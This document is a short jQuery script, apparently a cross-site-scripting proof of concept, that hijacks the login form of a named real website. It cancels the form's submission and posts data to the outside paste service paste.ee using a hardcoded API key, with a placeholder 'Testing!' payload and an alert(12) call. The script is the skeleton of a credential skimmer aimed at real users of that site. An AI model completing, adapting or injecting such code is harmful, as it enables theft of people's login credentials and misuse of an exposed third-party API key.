$('form[action="https://www.redlights.be/login/"]').on("submit", function(event) {
  $.post({
    url: "https://api.paste.ee/v1/pastes?key=uGxRzkmjJ1pbHcsSETDJsjbQn9ZVgGkV57utq9XG6",
    dataType:"json",
    data: '{"description":"test","sections":[{"name":"Section1","syntax":"autodetect","contents":"Testing!"}]}',
    complete: function(_, data) {
      console.log(data);
      alert(12);
    }
  });

  event.preventDefault();
});
